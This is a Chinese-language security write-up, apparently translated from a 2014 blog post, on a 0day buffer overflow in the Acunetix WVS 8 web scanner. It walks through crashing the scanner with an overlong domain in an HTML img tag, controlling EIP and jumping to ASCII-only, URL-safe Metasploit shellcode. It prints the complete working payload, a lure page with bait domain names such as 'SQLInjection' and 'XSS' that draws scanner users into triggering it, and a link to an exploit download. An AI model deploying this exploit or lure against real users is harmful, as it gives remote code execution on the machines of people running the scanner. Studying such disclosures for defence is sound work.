# 漏扫工具AWVS命令执行

From: http://an7isec.blogspot.co.il/2014/04/pown-noobs-acunetix-0day.html

0x00 概述
-------

* * *

几个星期前，作者曾发表了关于WINRAR 0DAY（文件名欺骗）的文章。得到了大量人的关注和询问，所以这次又放出一个0day (最热门的漏扫工具 wvs)。作者POC测试版本为： ACUNETIX 8 (build 20120704) 貌似是老外用的非常多版本。作者意图想让攻击者在使用wvs 按下扫描键前三思而后行（这个才是真正的主动防护吧：）。

0x01 漏洞分析
---------

* * *

ACUNETIX 是一款强大的漏扫工具，很多新手喜欢用这个工具进行扫描。

在扫描初始化阶段，会有这样一个附加选项，如下图

![enter image description here](http://drops.javaweb.org/uploads/images/d2cb6bc66f80d437f65e44307b77ecf6cb25667b.jpg)

这一点让作者产生了兴趣，通过分析得出wvs 在解析http response时，提取一些资源请求 类似:

```
<img src=http://externalSource.com/someimg.png >
<a href=http://externalSource.com/ ></a>
Etc...

```

作者又进一步分析了这个过程，惊奇的发现当某个外部域名长度超过268字节，wvs就会crash,作者开始尝试构造>=268字节长度的域名： 首先测试 如下

```
<A href= "http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"> 

```

用Immunity Debugger（OD是这工具的母板）附加挂载到wvs访问网站： Edx被0x41(A)覆盖 ，然后取数据段内存越权访问崩溃了：

![enter image description here](http://drops.javaweb.org/uploads/images/e7f2e4530d04cb2eced5ac7b8b5af31748eef799.jpg)

作者本打算利用SHE溢出执行shellcode但是比较麻烦。

这里有个难点：

因为是url字串所以避免url的编码类似

```
0x22 ("), 0x23 (#), 0x24 ($), 0x25 (%), 0x5C (), 0x2F (/)

```

所以，这里的shellcode不仅要是ascii，还要去除被URL编码的字符，也因为如此很难绕过SHE保护。

作者提出的思路，利用前面可控制的EDX构造一个可读的地址，同时要注意构造的edx地址要加8H

```
MOVE ECX, DWORD PTR DS: [EDX-8];

```

Edx必须满足下列两个条件：

```
1.[edx]可读
2.是ASCII符合并且没有被URL转义的符号

```

最终利用了0x663030XX 对应ascii值 f005。

前面精确测试出URL在268字节时溢出（不包括http://），溢出点就是269这里（500f开始）。

```
<img src="http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA500fBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB">

```

用wvs扫描

![enter image description here](http://drops.javaweb.org/uploads/images/5b4ef952394baef317585bc67b8d02cfc9f55704.jpg)

Ret之后，看到eip 被覆盖BBBB 0x42424242。

这里就选择shellcode 存放位置 ，eax是call函数时的参数，就只有268字节的A，esp当前栈顶指针指向着后面的B 明显选择esp（因为够大 ascii编码268字节的shellcode很紧张的） 能控制到eip,也找好了shellcode存放空间。

再者就是找jmp esp 以前都是用公开的通用地址，这里需要ascii字符且不被url编码的，作者用的系统sxs.dll 的0x7e79515d，ascii编码`]Qy~`组合起来整个poc就是

```
<img src=”http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA500fBBBB]Qy~BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB”>

```

最后，用metasploit的Alphanumeric Shell模块生成了一个纯ascii且没有被url编码的弹calc.exe的shellcode ,你也可以试试用mst生成其他的shellcode玩玩，选取的地址[edx]和wvs（没有开启dep的编译选项），所以绕过dep防护。

```
<img src="http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA500fBBBB]Qy~TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIHZXL9ID414ZTOKHI9LMUKVPZ6QO9X1P26QPZTW5S1JR7LCTKN8BGR3RWS9JNYLK79ZZ165U2KKLC5RZGNNUC70NEPB9OUTQMXPNMMPV261UKL71ME2NMP7FQY0NOHKPKZUDOZULDS8PQ02ZXM3TCZK47PQODJ8O52JNU0N72N28MZKLTNGU7ZUXDDXZSOMKL4SQKUNKMJPOOCRODCMDKR0PGQD0EYIRVMHUZJDOGTUV2WP3OIVQ1QJSLSKGBLYKOY7NWWLNG6LBOM5V6M0KF2NQDPMSL7XT80P61PBMTXYQDK5DMLYT231V649DZTPP26LWSQRLZLQK15XUXYUNP1BPF4X6PZIVOTZPJJRUOCC3KD9L034LDOXX5KKXNJQMOLSJ6BCORL9WXQNKPUWN KRKJ8JSNS4YMMOHT3ZQJOHQ4QJUQLN1VSLV5S1QYO0YA">

```

0x02 利用
-------

* * *

作者这里搞的非常好玩，因为这个点必须要用wvs人选择下面这个才会有效。

![enter image description here](http://drops.javaweb.org/uploads/images/1f7fe0e881ed6375f86393059a79c8555df5077e.jpg)

So,作者很猥琐构造了一些很诱惑的外部域名

```
“SQLINJECTION” 
“XSS” 
“CSRF” 
And so on…





<html>
<img src="http://SQLInjection..............................................................................................................................................................................................AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA500fBBBB]Qy~TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIHZXL9ID414ZTOKHI9LMUKVPZ6QO9X1P26QPZTW5S1JR7LCTKN8BGR3RWS9JNYLK79ZZ165U2KKLC5RZGNNUC70NEPB9OUTQMXPNMMPV261UKL71ME2NMP7FQY0NOHKPKZUDOZULDS8PQ02ZXM3TCZK47PQODJ8O52JNU0N72N28MZKLTNGU7ZUXDDXZSOMKL4SQKUNKMJPOOCRODCMDKR0PGQD0EYIRVMHUZJDOGTUV2WP3OIVQ1QJSLSKGBLYKOY7NWWLNG6LBOM5V6M0KF2NQDPMSL7XT80P61PBMTXYQDK5DMLYT231V649DZTPP26LWSQRLZLQK15XUXYUNP1BPF4X6PZIVOTZPJJRUOCC3KD9L034LDOXX5KKXNJQMOLSJ6BCORL9WXQNKPUWN KRKJ8JSNS4YMMOHT3ZQJOHQ4QJUQLN1VSLV5S1QYO0YA”>
<img src="http://XSS..............................................................................................................................................................................................">
<img src="http://CSRF..............................................................................................................................................................................................">
<img src="http://DeepScan..............................................................................................................................................................................................">
<img src="http://NetworkScan..............................................................................................................................................................................................">
<img src="http://DenialOfService..............................................................................................................................................................................................">
</html>

```

如下图：

![enter image description here](http://drops.javaweb.org/uploads/images/c4ac8900647cfdb6e45a3d975df096837ec35393.jpg)

0x03 总结
-------

* * *

我测试Wvs8.0 build 20120704 版本是可以成功弹出calc的。

后面评论有人说wvs8.0更新的版本也存在这个问题，我这里测试下列版本：

Wvs8.0 20130416版本 Wvs9 各个版本

都不存在此问题。

![enter image description here](http://drops.javaweb.org/uploads/images/37411dda03d0651d4654f8a67aecd868107f9710.jpg)

作者给出的[exp下载](http://static.wooyun.org/20141017/2014101715304818610.zip)。